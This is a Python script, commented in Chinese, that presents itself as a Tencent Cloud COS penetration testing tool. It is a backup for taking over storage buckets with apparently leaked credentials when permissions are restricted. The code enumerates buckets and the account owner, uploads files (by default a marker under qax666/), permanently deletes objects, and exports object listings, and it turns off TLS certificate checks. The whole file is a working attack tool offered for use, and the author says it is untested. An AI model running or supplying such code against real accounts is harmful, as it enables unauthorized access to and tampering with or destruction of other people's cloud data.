#此脚本为备用脚本，如果在使用第一个脚本直接异常大概率是做了细化权限或者跨域之类的问题导致接管失败了
#这个备份脚本的功能除了和cos_explorer大致功能一致还单独写了独立的文件上传、删除文件、列举对象的功能
#但是需要你知道桶名和地域（可能会在获取凭据的接口一起返回）然后可以单独检测是不是只有文件上传的权限等细化的权限
#注意此脚本我也没有在对应的环境使用过，所以是否有作用也是未知，但是代码还是发出来了，如果有碰到此场景的说不上可以用上

#使用前依旧在代码中填充凭据三要素

from qcloud_cos import CosConfig, CosS3Client, CosServiceError
import json
import logging
import ssl
import os
from datetime import datetime
import mimetypes
import openpyxl
from openpyxl.styles import Font

ssl._create_default_https_context = ssl._create_unverified_context

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
#填充三要素
config = CosConfig(
    Region='ap-beijing', #默认
    Secret_id='xxxxx',
    Secret_key='xxxxx',
    Token='xxxxx',
)
client = CosS3Client(config)

def upload_file(client, bucket_name, bucket_region, local_path, object_key):
    if not os.path.isfile(local_path):
        print(f"错误: 本地文件 '{local_path}' 不存在")
        return None
    object_url = f"https://{bucket_name}.cos.{bucket_region}.myqcloud.com/{object_key}"
    print(f"上传文件: {local_path} → {object_url}")
    try:
        mime_type, _ = mimetypes.guess_type(local_path)
        if not mime_type:
            mime_type = 'application/octet-stream'
        response = client.upload_file(
            Bucket=bucket_name,
            LocalFilePath=local_path,
            Key=object_key,
            PartSize=10,
            MAXThread=10,
            EnableMD5=False,
            Metadata={'Content-Type': mime_type}
        )
        if 'ETag' in response:
            print(f"上传成功! ETag: {response['ETag']}")
            return object_url
        else:
            print("上传失败: 未知错误")
            return None
    except CosServiceError as e:
        print(f"上传失败 (服务错误): {e.get_error_code()} - {e.get_error_msg()}")
        return None
    except Exception as e:
        print(f"上传失败: {str(e)}")
        return None

def delete_file(client, bucket_name, bucket_region, object_key):
    object_url = f"https://{bucket_name}.cos.{bucket_region}.myqcloud.com/{object_key}"
    print(f"准备删除文件: {object_url}")
    confirm = input(f"确定要永久删除 '{object_key}' 吗? (y/n): ").lower()
    if confirm != 'y':
        print("取消删除操作")
        return False
    try:
        client.delete_object(Bucket=bucket_name, Key=object_key)
        print(f"文件删除成功: {object_key}")
        return True
    except CosServiceError as e:
        print(f"删除失败 (服务错误): {e.get_error_code()} - {e.get_error_msg()}")
        return False
    except Exception as e:
        print(f"删除失败: {str(e)}")
        return False

def list_bucket_objects(client, bucket_name, bucket_region, save_if_large=True):
    print(f"\n列出存储桶 [{bucket_name}] 中的对象...")
    try:
        response = client.list_objects(Bucket=bucket_name, MaxKeys=1000)
        if 'Contents' not in response:
            print("该存储桶无对象或无权限")
            return

        contents = response['Contents']
        print(f"共获取到 {len(contents)} 个对象")
        display_limit = 100
        print("\n{:<60} {:<12} {:<20}".format("对象名称", "大小(Byte)", "最后修改时间"))
        print("-"*100)
        for i, obj in enumerate(contents[:display_limit]):
            print("{:<60} {:<12} {:<20}".format(
                obj['Key'], obj['Size'], obj['LastModified']
            ))
        if len(contents) > display_limit and save_if_large:
            print(f"\n超过 {display_limit} 个对象，保存全部对象信息到 Excel 文件中...")
            save_objects_to_excel(bucket_name, contents)
            print("保存完成")

    except Exception as e:
        print(f"列举失败: {e}")

def save_objects_to_excel(bucket_name, object_list):
    folder = os.path.join(os.getcwd(), bucket_name)
    os.makedirs(folder, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"objects-{ts}.xlsx"
    filepath = os.path.join(folder, filename)

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "对象列表"
    ws.append(["对象键", "大小（字节）", "最后修改时间"])
    for obj in object_list:
        ws.append([obj['Key'], obj['Size'], obj['LastModified']])

    for col in ws.columns:
        length = max(len(str(cell.value)) for cell in col)
        col_letter = col[0].column_letter
        ws.column_dimensions[col_letter].width = length + 2

    wb.save(filepath)
try:
    print("="*50)
    print("腾讯云 COS 渗透测试工具")
    print("功能: 存储桶枚举 | 上传文件 | 删除对象 | 列举对象")
    print("="*50)

    response = client.list_buckets()

    if 'Buckets' in response and 'Bucket' in response['Buckets'] and len(response['Buckets']['Bucket']) > 0:
        buckets = response['Buckets']['Bucket']
        owner = response.get('Owner', {})
        print(f"\n账户存储桶列表 (共 {len(buckets)} 个)")
        print(f"账户所有者: {owner.get('DisplayName', '未知')} ({owner.get('ID', '未知ID')})")

        while True:
            print("\n" + "="*80)
            for b in buckets:
                print(f"- {b['Name']:<35} | 地域: {b['Location']} | 创建时间: {b['CreationDate']}")
            print("="*80)
            bucket_name = input("请输入要操作的存储桶名称（或输入 exit 退出）: ").strip()
            if bucket_name.lower() == 'exit':
                break
            selected = next((b for b in buckets if b['Name'] == bucket_name), None)
            if not selected:
                print("未找到该存储桶，请重新输入")
                continue
            bucket_region = selected['Location']
            print(config._secret_id)
            bucket_client = CosS3Client(CosConfig(
                Region=bucket_region,
                Secret_id=config._secret_id,
                Secret_key=config._secret_key,
                Token=config._token,
                Scheme='https'
            ))

            while True:
                print("\n当前桶操作菜单:")
                print("1. 上传文件")
                print("2. 删除对象")
                print("3. 列出所有对象")
                print("4. 返回上一级")
                choice = input("请输入操作编号: ").strip()

                if choice == '1':
                    local_path = input("请输入本地文件路径 如C:/test/test.txt（留空默认上传 内容为5201314的test.txt 到 桶中的/qax666/test.txt）: ").strip()
                    if not local_path:
                        test_file = 'test.txt'
                        if not os.path.exists(test_file):
                            with open(test_file, 'w', encoding='utf-8') as f:
                                f.write("5201314")
                        local_path = test_file
                        object_key = 'qax666/test.txt'
                    else:
                        object_key = input("请输入要上传到的 COS 对象路径（如 test/1.txt）: ").strip()
                    url = upload_file(bucket_client, bucket_name, bucket_region, local_path, object_key)
                    if url:
                        print(f"上传成功，文件 URL：{url}")
                        print("上传完成，重新列出对象查看是否成功，建议访问上传的完整url来判断是否上传成功：")
                        list_bucket_objects(bucket_client, bucket_name, bucket_region)

                elif choice == '2':
                    key = input("请输入要删除的对象键（如test/1.txt）: ").strip()
                    if delete_file(bucket_client, bucket_name, bucket_region, key):
                        print("删除完成，重新列出对象查看是否成功，建议访问完整url来判断是否删除成功：")
                        list_bucket_objects(bucket_client, bucket_name, bucket_region)

                elif choice == '3':
                    list_bucket_objects(bucket_client, bucket_name, bucket_region)

                elif choice == '4':
                    break
                else:
                    print("无效输入，请重新选择")

    else:
        raise Exception("未返回有效桶")
except Exception as e:
        print("未能获取存储桶列表，可能无权限，也可能细化了权限比如只能上传文件，只能删除文件，进入备用操作模式的前提是已经知道了桶名和地域，需要在此填充这两个值：")
        while True:
            print("\n简化菜单:")
            print("1. 上传文件")
            print("2. 删除对象")
            print("3. 列举对象")
            print("4. 退出")
            action = input("请选择功能编号: ").strip()
            if action == '4':
                break
            bucket_name = input("请输入存储桶名称（如xxxxx-1306817765）: ").strip()
            bucket_region = input("请输入地域（如 ap-beijing）: ").strip()
            bucket_client = CosS3Client(CosConfig(
                Region=bucket_region,
                Secret_id=config._secret_id,
                Secret_key=config._secret_key,
                Token=config._token,
                Scheme='https'
            ))

            if action == '1':
                local_path = input("请输入本地文件路径 如C:/test/test.txt（留空默认上传 内容为5201314的test.txt 到 桶中的/qax666/test.txt）:").strip()
                if not local_path:
                    test_file = 'test.txt'
                    if not os.path.exists(test_file):
                        with open(test_file, 'w', encoding='utf-8') as f:
                            f.write("5201314")
                    local_path = test_file
                    object_key = 'qax666/test.txt'
                else:
                    object_key = input("请输入要上传到的 COS 对象路径（如 test/1.txt）: ").strip()
                url = upload_file(bucket_client, bucket_name, bucket_region, local_path, object_key)
                if url:
                    print(f"上传成功，文件 URL：{url}")

            elif action == '2':
                key = input("请输入要删除的对象键,前提是你知道有哪些键也就是这个桶中已经存在了哪些文件，建议在能实现上传的功能再测试此功能（如test/1.txt）:").strip()
                delete_file(bucket_client, bucket_name, bucket_region, key)

            elif action == '3':
                list_bucket_objects(bucket_client, bucket_name, bucket_region)

            else:
                print("无效选择，请重新输入")

finally:
    print("程序结束")
